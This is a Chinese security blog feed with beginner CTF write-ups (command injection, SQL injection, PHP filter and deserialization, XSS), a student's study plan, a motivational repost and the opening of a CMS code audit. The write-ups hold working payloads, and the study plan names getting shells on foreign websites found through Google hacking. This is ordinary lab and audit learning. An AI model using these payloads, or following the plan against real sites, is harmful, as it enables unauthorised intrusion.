        <content type="html"><![CDATA[<p>HFSEC Writeup</p><p>这个平台的题比较<strong>简单,适合新手入门</strong></p><h1 id="Web-linux"><a href="#Web-linux" class="headerlink" title="Web-linux"></a>Web-linux</h1><h2 id="初识linux命令"><a href="#初识linux命令" class="headerlink" title="初识linux命令"></a>初识linux命令</h2><p>进去是一个ping 127.0.0.1</p><p>用linux管道符|</p><p>ping 127.0.0.1|ls</p><p>得到</p><p>flag.php<a id="more"></a><br>index.php</p><p>然后再</p><p>ping 127.0.0.1|cat flag.php 得到flag</p><p>HFCTF{84B29DA8F42ED3AF4BF098D8FFEE4DC7}</p><h2 id="命令执行-simple-bypass"><a href="#命令执行-simple-bypass" class="headerlink" title="命令执行 | simple_bypass"></a>命令执行 | simple_bypass</h2><p>饿…其实第一题的思路已经把第二题做出来了</p><p>HFCTF{E286902D28AC288657881186D4DFD27EFC7A1873}</p><p>出题人给了一个帖子,我也把贴在这里好了</p><p><a href="https://www.freebuf.com/articles/web/137923.html" target="_blank" rel="noopener">浅谈CTF中命令执行与绕过的小技巧</a></p><h1 id="Web-php"><a href="#Web-php" class="headerlink" title="Web-php"></a>Web-php</h1><h2 id="php类型转换的游戏"><a href="#php类型转换的游戏" class="headerlink" title="php类型转换的游戏"></a>php类型转换的游戏</h2><ul><li>正如题目描述那样,利用sha1()函数不能处理数组返回null就成功了</li></ul><p>?foo[]=1&amp;bar[]=2</p><p>HFCTF{2393FC5EFAA4FEDF7AB0E29DBBA51CE4A8DD6F34}</p><h2 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h2><p>/?scan=&amp;file=</p><p>得到</p><p>cookie.txt<br>example.txt<br>flag.php<br>index.php<br>phpinfo.php</p><p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p><p>将所得内容进行base64解码得到flag</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="SQL0-SQL基础命令"><a href="#SQL0-SQL基础命令" class="headerlink" title="SQL0 | SQL基础命令"></a>SQL0 | SQL基础命令</h2><p>SELECT flag FORM flag</p><p>HFCTF{E6A69A7BF46C8DC259C5BD69CE9577B4}</p><h2 id="SQL1-任意登陆"><a href="#SQL1-任意登陆" class="headerlink" title="SQL1 | 任意登陆"></a>SQL1 | 任意登陆</h2><p>构造用户名为 1’ or 1=1# 密码随便 登录就拿到flag</p><h2 id="SQL2-登陆伪造"><a href="#SQL2-登陆伪造" class="headerlink" title="SQL2 | 登陆伪造"></a>SQL2 | 登陆伪造</h2><pre class=" language-php"><code class="language-php"><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM user WHERE username = '$user' AND password = '$pass', $link"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">'HFCTF{****************************}'</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在按照第一题的做法后给出了一篇教学文章,并且给出了源码</p><p><a href="http://111.230.11.183:44444/basic_skills/sql/PXWEFKMYXXVAQBFGPYRFUSSKDJJNILRB.html" target="_blank" rel="noopener">教学文章</a></p><p>按照文章教学的做就出来了</p><p>先用</p><pre class=" language-mysql"><code class="language-mysql">1' or 1=2 UNION SELECT 'root','root'#</code></pre><p>因为’1’ 然后 or 1=2 为假,前面的查询语句就没有结果,然后后面UNION SELECT ‘root’,’root’#</p><p>就会创建一个新的字段在 username和password字段中</p><p>HFCTF{A9F2A0E2C0B9B9F9B4C0D8C5D0E9E3E1}      </p><h2 id="XSS1-简单弹框"><a href="#XSS1-简单弹框" class="headerlink" title="XSS1 | 简单弹框"></a>XSS1 | 简单弹框</h2><p>构造</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>弹窗后得到flag</p><h2 id="XSS3-一点点过滤"><a href="#XSS3-一点点过滤" class="headerlink" title="XSS3 | 一点点过滤"></a>XSS3 | 一点点过滤</h2><ul><li>过滤：script</li><li>过滤：on</li><li>替换：alert =&gt; * * * * *</li></ul><p>将aler进行HTML编码</p><pre class=" language-html"><code class="language-html"><span class="token entity" title="&#x61;">&amp;#x61;</span><span class="token entity" title="&#x6c;">&amp;#x6c;</span><span class="token entity" title="&#x65;">&amp;#x65;</span><span class="token entity" title="&#x72;">&amp;#x72;</span><span class="token entity" title="&#x74;">&amp;#x74;</span><span class="token entity" title="&#x28;">&amp;#x28;</span><span class="token entity" title="&#x31;">&amp;#x31;</span><span class="token entity" title="&#x29;">&amp;#x29;</span></code></pre><p>提交后得到alert(1)</p><pre class=" language-html"><code class="language-html"><span class="token entity" title="&#x3c;">&amp;#x3c;</span><span class="token entity" title="&#x73;">&amp;#x73;</span><span class="token entity" title="&#x63;">&amp;#x63;</span><span class="token entity" title="&#x72;">&amp;#x72;</span><span class="token entity" title="&#x69;">&amp;#x69;</span><span class="token entity" title="&#x70;">&amp;#x70;</span><span class="token entity" title="&#x74;">&amp;#x74;</span><span class="token entity" title="&#x3e;">&amp;#x3e;</span><span class="token entity" title="&#x61;">&amp;#x61;</span><span class="token entity" title="&#x6c;">&amp;#x6c;</span><span class="token entity" title="&#x65;">&amp;#x65;</span><span class="token entity" title="&#x72;">&amp;#x72;</span><span class="token entity" title="&#x74;">&amp;#x74;</span><span class="token entity" title="&#x28;">&amp;#x28;</span><span class="token entity" title="&#x31;">&amp;#x31;</span><span class="token entity" title="&#x29;">&amp;#x29;</span><span class="token entity" title="&#x3c;">&amp;#x3c;</span><span class="token entity" title="&#x2f;">&amp;#x2f;</span><span class="token entity" title="&#x73;">&amp;#x73;</span><span class="token entity" title="&#x63;">&amp;#x63;</span><span class="token entity" title="&#x72;">&amp;#x72;</span><span class="token entity" title="&#x69;">&amp;#x69;</span><span class="token entity" title="&#x70;">&amp;#x70;</span><span class="token entity" title="&#x74;">&amp;#x74;</span><span class="token entity" title="&#x3e;">&amp;#x3e;</span></code></pre><p>得到</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>但是并没有弹窗</p><h2 id="备份的艺术"><a href="#备份的艺术" class="headerlink" title="备份的艺术"></a>备份的艺术</h2><p>.index.php.swp</p><p>打开搜索flag</p><h2 id="JS-aaencode"><a href="#JS-aaencode" class="headerlink" title="JS aaencode"></a>JS aaencode</h2><p><a href="http://ctf.ssleye.com/aaencode.html" target="_blank" rel="noopener">http://ctf.ssleye.com/aaencode.html</a></p><p>在这里解开了行了</p><h2 id="HTTP-check-header"><a href="#HTTP-check-header" class="headerlink" title="HTTP | check header"></a>HTTP | check header</h2><p><img src="https://i.loli.net/2019/12/29/l4ATQHS8mwpzZEh.png" alt="1.png"></p><p>当然也可以用抓包</p><h2 id="SQL3-数据获取"><a href="#SQL3-数据获取" class="headerlink" title="SQL3 | 数据获取"></a>SQL3 | 数据获取</h2><p>直接用sqlmap就可以跑出来</p><p><img src="https://i.loli.net/2019/12/29/Z4cU8fsBmHxNEei.png" alt="2.png"></p><p>继续使用查表和查字段的命令</p><p>得到表为user,字段为username和password</p><p>最后得到flag</p><p>HFCTF{40356E66E78BB1DC1EFBC04FA4336F59}</p><h2 id="HTTP-重定向"><a href="#HTTP-重定向" class="headerlink" title="HTTP | 重定向"></a>HTTP | 重定向</h2><p>抓包,注意改URL</p><p><img src="https://i.loli.net/2019/12/29/OSI7RZg1t6o5Cah.png" alt="3.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>i春秋CTF答题夺旗赛（第四季）Writeup</title>
      <link href="/posts/20191228/"/>
      <url>/posts/20191228/</url>
      
        <content type="html"><![CDATA[<p>i春秋CTF答题夺旗赛（第四季）不完全Writeup</p><h1 id="nani"><a href="#nani" class="headerlink" title="nani"></a>nani</h1><ul><li>文件包含</li><li>反序列化</li><li>命令执行</li></ul><pre><code>http://120.55.43.255:24719/index.php?file=php://filter/read=convert.base64-encode/resource=user.php</code></pre><p>base64解码后得到源码,是一个反序列化,其中只有一个点就是绕过__wakeup()魔法函数</p><a id="more"></a><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">convent</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$warn</span> <span class="token operator">=</span> <span class="token string">"No hacker."</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">warn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token function">get_object_vars</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$k</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>payload: cmd=O:7:”convent”:2:{s:4:”warn”;s:13:”system(‘ls’);”;} </p><p>因为之前cat /flag不成功,所以可以使用ls命令列出所有的文件,因为flag肯定会在一个文件夹里面</p><p>即dsuhhjfdgjhaskjdkj.txt,访问该目录得到flag</p><pre><code>flag{qishinizhixuyaocaidaozhegewenjiandemingzijiuxingle}</code></pre><h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><ul><li>简单PHP代码审计</li><li>mt_srand()函数特性</li><li>函数以及字符串细节</li></ul><pre class=" language-php"><code class="language-php">  <span class="token delimiter">&lt;?php</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$seed</span> <span class="token operator">=</span> @<span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$key</span> <span class="token operator">=</span> @<span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$true_key</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$true_key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Key Confirm"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Key Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">eval</span><span class="token punctuation">(</span> <span class="token string">"var_dump($a);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#这里可通过构造全局变量输出flag,并且,这里的eval函数中的代码块是通过双引号</span><span class="token string">""</span>括起来的<span class="token punctuation">,</span>php会将其中的变量当作代码执行<span class="token punctuation">,</span>可以通过字符串截断导致更严重的getshell<span class="token punctuation">.</span>这一点是师傅讲的<span class="token punctuation">,</span>以前就只知道php的<span class="token string">""</span>是有文章的<span class="token punctuation">.</span>后面会进行深度研究<span class="token delimiter">?></span></code></pre><p>这里的mt_srand()函数是用来生成一个随机数,但是当知道种子的情况下,这个随机是为随机的</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>得到key为 644748169</p><p>payload</p><pre><code>?hello=$GLOBALS&amp;seed=123&amp;key=644748169</code></pre><pre><code>flag{Y0u_Solv3_s4mpl3...oNc3_Mor3}</code></pre><h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><ul><li>简单PHP代码审计</li><li>PHP伪协议</li></ul><pre class=" language-php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"pass"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"hello admin!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//class.php</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"you are not admin ! "</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token operator">--</span><span class="token operator">></span></code></pre><p>payload</p><p>?user=php://input&amp;file=class.php</p><p>admin</p><p><img src="https://i.loli.net/2019/12/28/MQAqBj4rSux9VcE.png" alt="image-20191228013927541.png"></p><p>按理说应该打的出flag的啊!</p><p>我旁边的师傅也认为是题目环境有问题-.-</p><h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><pre class=" language-php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>    <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">"****************"</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"Right!!!login success"</span><span class="token punctuation">;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"Wrong password.."</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">></span></code></pre><p>这里如果输入的password和原本定义的长度大小相等就输出flag,这里的strcmp是区分大小写的</p><p>strcmp()函数存在漏洞,</p><p><strong>在5.3版本之前,当函数接受了不符合的类型,函数发生错误,return 0</strong></p><p><strong>POST的内容为</strong></p><p><strong>password[]=1就可以绕过第二个if语句</strong></p><p>然后请求一个path=ping.php</p><p>按理说应该得到什么东西的-.-</p><p>但是也没有什么反应</p><h1 id="post1"><a href="#post1" class="headerlink" title="post1"></a>post1</h1><ul><li>命令执行</li></ul><pre class=" language-php"><code class="language-php"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//read flag.txt But no cat!！！</span></code></pre><p>注释中说的是 打开flag.txt但是cat应该是被过滤了</p><p>注意这里的的参数传递过程,system()函数执行的参数是变量c的值,而且我们知道这个函数的正确用法应该是类似这样system(‘cat /flag’),必须用单引号将其中的命令闭合</p><p>eval(system())这个结构其实蛮有意思的</p><p>大概就做了一会儿,做不出,也没做了,关于命令执行这个点也没怎么深入学习</p><p>还是那句话,知道自己是菜鸡,就要多学习!</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>考核期寒假任务</title>
      <link href="/posts/20191225/"/>
      <url>/posts/20191225/</url>
      
        <content type="html"><![CDATA[<p>大一下学期开学前</p><ul><li>学习漏洞,做好分类,细化,发散,要点要包含的全面,学习的深度.配合实例以及本地demo,如果可以,有能力复现CVE一下</li><li>搭建本地AWD环境,部署3个docker.学习linux操作,docker的启动,审simple,学习python脚本实现打全场</li><li>挂代理VPS,找国外的网站拿shell</li><li>如果有时间,在网站源码网上找个没有别人审过的CMS,审出来,并且提交到补天漏洞平台</li><li>学习渗透测试流程步骤</li><li>在以上学习过程中,会学到其他语言如json,bash脚本等.多本地写,提高编程能力.</li><li>整理电脑磁盘,文档,做好分类.以及脚本的分类</li></ul><ul><li><a href="https://github.com/zhl2008/awd-platform/" target="_blank" rel="noopener">https://github.com/zhl2008/awd-platform/</a>   AWD平台搭建</li><li><a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a>   CTF刷题</li><li><a href="https://www.a5xiazai.com/php/" target="_blank" rel="noopener">https://www.a5xiazai.com/php/</a>  代码审计</li><li><a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a> 利用Google Hacking自己找站拿shell</li><li><a href="https://github.com/404notf0und/AI-for-Security-Learning" target="_blank" rel="noopener">https://github.com/404notf0und/AI-for-Security-Learning</a>  知识学习</li><li><a href="https://www.k0rz3n.com/" target="_blank" rel="noopener">https://www.k0rz3n.com/</a> 学习模板,差不多就是按照这个师傅这样学</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>其实没有所谓的安逸,只不过是有人替我们负重前行</title>
      <link href="/posts/20191223/"/>
      <url>/posts/20191223/</url>
      
        <content type="html"><![CDATA[<h1 id="其实没有所谓的安逸-只不过是有人替我们负重前行"><a href="#其实没有所谓的安逸-只不过是有人替我们负重前行" class="headerlink" title="其实没有所谓的安逸,只不过是有人替我们负重前行"></a>其实没有所谓的安逸,只不过是有人替我们负重前行</h1><p>每一次回家,每次都会有不同的感悟,这感悟不光是来自我其他学校的好朋友的一些生活分享,也来自自我的体验.</p><p>就如我的标题所言—-“只不过是有人替我(们)负重前行”,真的很感谢他们,但是有时候有希望自己能做出些事情来改变,希望负重的是我们.</p><p>在知乎上看到的,觉得很有道理,这里就直接copy过来吧.<strong>文末注明出处</strong></p><p>你学习一般，考上了现在的这所学校，成绩不算好，拿不到奖学金，上课不听讲，上自习不规律,考试靠突击，同学帮一把的话也能每科考到七八十分，但是与优秀总有很大距离。</p><a id="more"></a><p>你家境一般，父母都是普通员工，你在这个城市的生活费是每月一千二，没事下下馆子,一个月添件衣服，想买台相机，咬咬牙才能买双自己喜欢的鞋。  </p><p>你几乎没有特长，不会弹吉他，不会弹钢琴，不会跳舞，不会画画，想学摄影却不会使用图片处理软件，想上台演出却没信心，学校晚会比赛的时候，你经常是站在台下围观的人群里的一员，你与聚光灯环绕的舞台几乎绝缘。 </p><p>你的感情也是一般，有时候会遇见自己心仪的那个人，但是总抓不住机会，眨眼间那个人就被其他人俘获，你就开始伤心、抱怨，但是几天之后又开始寻找新的心上人，就这样看着一个个心上人走过，直到你毕业，与其中任何一个都没有发展。 </p><p>总之，你没有什么特别的地方 ，就和周围的千万个普通人一样。 </p><p>你不甘心拿不到奖学金，看见别人得奖学金的时候你会说那完全是突击的结果，于是你开始上自习，不过你只坚持了一星期。<br>你不甘心自己的父辈平平，于是你批评讽刺自己周围的“官二代”、“富二代”，立志要努力学习争取成功，也好让自己的孩子成为“富二代”，你的热情持续了一个星期。<br>你不甘心自己什么特长都没有，于是你开始学弹吉他、买滑轮鞋、借来摄影方面的书籍，你对着镜子微笑着说：“你是最棒的。” 这份虚假的信心维持了一个星期。<br>你不甘心自己没有伴侣，你决心洗心革面重新做人，你删掉电脑里的偶像剧肥皂剧，你收拾起床上的懒人桌，把零食袋子统统扔掉，然后洗了个澡并且修饰了一下自己，你往发型上喷了啫喱水，好让自己看起来很精神，你怀揣着一本成功学的书决定出去走走，开始新的生活。这样的状态，你稀稀拉拉地坚持了一个星期。<br>一个星期之后，你还是和周围千万个人一样，你还是和一星期前的自己一样。<br>你逛网络论坛，看到了这样一句话：“二十岁是人生最美好的时光，不应该局限在学校里教室里，应该享受生活。” 于是你相信了，你觉得二十岁的你就应该“随心所欲”，享受“人生中最后的自由时光”；就应该“快乐地去恋爱”“风华正茂”“挥斥方遒”······<br>现在的你，用着父母的血汗钱，用着名牌包、穿着名牌跑鞋、骑着捷安特山地车、用着佳能牌的相机和苹果牌的手机，还经常去星巴克喝喝咖啡体验一下小资情调······<br>那么，请允许我猜测一下你的未来——<br>在大四将要结束时，你考研落榜。你风风火火的参加校园招聘会，很多公司你都看不上，嫌他们不是体制内单位、平台窄、规模小，直到毕业，你还没有找到心仪的工作。你收拾好行李回到老家，父母让你试着参加各种招聘考试或者参加当地的应聘会，你不去，因为你觉得那些工作太简单了，不适合你，你应该去寻找更好的就业机会。可是，当你去那些你看得上的公司应聘时，你的竞争对手太多了，而且都不差，你表现平平，理所当然地被拒之门外······<br>现在的你，也许还在上大学，也许和恋人恩恩爱爱，每天黏在一起，午饭晚饭一起去吃，晚自习后还会一起在操场散步。你们讨论起未来，最后的结论总是：不要想得太多，认真过好现在就好。  不幸运的话，几个月后，你们就分手了，你凄凄惨惨戚戚，反复问自己究竟哪里做错了；幸运的话，你们会一直恋爱到毕业，最终，你绝得自己不够优秀没能力去对方所在的城市读研或者工作，所以你们带着不舍和悔恨分手了。<br>现实很残酷，至此，你信了。<br>现在的你喜欢刷微博，你会全力支持那些你赞同的观点，你会激励否定那些你反对的观点。你爱憎分明，看起来很有正义感。你觉得血气方刚的年轻人就应该敢于说出自己的心声。你可能从来不会去想一个问题：你的观点，来自哪里？其实，它们绝大部分来自网络，它们已经蚕食了你的判断力。<br>现在，我只想问你一个问题：二十岁的你，有什么资本。<br>你只是千千万万人中微不足道的一个人，少了你，地球还是一样会转。<br>我敢打赌，一定很久没人和你说过“吃得苦中苦，方为人上人”这句话了吧？<br>你知道“责任”两个字是怎么写的吗?<br>当你谈论飞翔的时候，你是不是忘记了地心引力的存在？<br>现在的你，如果还是放纵着自己的懒惰与幼稚，虚度着光阴，那么，你就虚度去吧。反正我已经过了二十岁的年纪，我还有未来，我得直奔向前了，不陪你了。<br>再见<br>——华文《20岁无资本无未来》</p><p><a href="http://tieba.baidu.com/p/6103116057?traceid=" target="_blank" rel="noopener">一段值得花几分钟看完的话</a></p><p>确实,我或许没有文章中写的那样,但是这一段话真的让我瞬间觉得以前的我,太傻了.</p><p>时间已经不多了,希望自己利用好时间,提升自己,把自己丰富起来,成熟点,少点功利心,做事情果断,是就是,不是就不是,从内在改变自己.</p>]]></content>
      
      
      <categories>
          
          <category> 有感而发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>熊海CMS代码审计报告</title>
      <link href="/posts/20191222/"/>
      <url>/posts/20191222/</url>
      
        <content type="html"><![CDATA[<h1 id="熊海CMS代码审计报告"><a href="#熊海CMS代码审计报告" class="headerlink" title="熊海CMS代码审计报告"></a>熊海CMS代码审计报告</h1><p>环境:Windows 10   Phpstudy 2018(php5.2.17+Apache)   Sublime Text 3 </p><p>Tips</p><p>如果数据库连接失败,打开mysql配置的my.ini在最后一行加入skip-grant-tables</p><hr><p>通读一遍代码,发现对参数入口的过滤做的太少了;这个CMS是一个小型网站,功能有点类似博客,功能有,登录,评论留言,发表文章,上传(上传头像,图片,视频),引入外链,下载 ;</p><a id="more"></a><hr><p>在Seay自动审计系统中,先扫一遍,看一个大概</p><p><img src="https://i.loli.net/2019/12/22/GT9pq7c2dPtgB3i.png" alt></p><h2 id="0x01-文件包含漏洞"><a href="#0x01-文件包含漏洞" class="headerlink" title="0x01:文件包含漏洞"></a>0x01:文件包含漏洞</h2><p>在index.php 中,使用addslashes()函数,对传入的文件名中的掉预编译字符(单双引号,反斜线/,NULL)前加入反斜线/</p><p><img src="https://i.loli.net/2019/12/22/bnKwBrEpyfDOZUM.png" alt> </p><p>因为参数r可控且无任何过滤,存在include()文件包含函数,可能发生文件包含漏洞</p><p>同样的,在admin/index.php里面也有这样的问题    </p><p><img src="https://i.loli.net/2019/12/22/noiRZI1W7yhSN5T.png" alt></p><p>对传人$action没有经过检测,直接拼接进入include()函数,可以通过文件包含漏洞读取一些关键的配置文件,如数据库的配置信息;</p><p>复现:写一个shell.php在文件中,里面的内容为: </p><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span>     由于<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span>包含的是files目录下的文件<span class="token punctuation">,</span>所以用<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">(</span>目录切换符<span class="token punctuation">)</span>来切换目录     也可以直接把shell<span class="token punctuation">.</span>php写在files目录下<span class="token punctuation">,</span>就不用目录切换了</code></pre><p><img src="https://i.loli.net/2019/12/22/aNS43ZwuPO7tTri.png" alt>  </p><p>文件包含漏洞经常会和文件上传漏洞结合使用,这里突然想到了,如果上传功能存在漏洞,通过抓包各种姿势,成功传了一个shell.php在upload/touxiang/目录里面,这个CMS会对文件名随机命名,但是没关系,是不是可以用这个payload:</p><p><a href="http://127.0.0.1/xh/?r=../upload/touxiang/shell.php" target="_blank" rel="noopener">http://127.0.0.1/xh/?r=../upload/touxiang/shell.php</a></p><hr><h2 id="0x02垂直越权登录后台"><a href="#0x02垂直越权登录后台" class="headerlink" title="0x02垂直越权登录后台"></a>0x02垂直越权登录后台</h2><p>在checklogin.php中对登录的检测只用了一个COOKIE检测,如果user为空,窗口重新定向到login</p><p>只要不为空,就可以访问其他后台页面</p><p><img src="https://i.loli.net/2019/12/22/TMb6kNqodml3WDO.png" alt></p><p>在/admin/?r=login中是登录后台的页面,随便输入东西,抓个包来分析</p><p><img src="https://i.loli.net/2019/12/22/aj1r2t7NuOnzCsd.png" 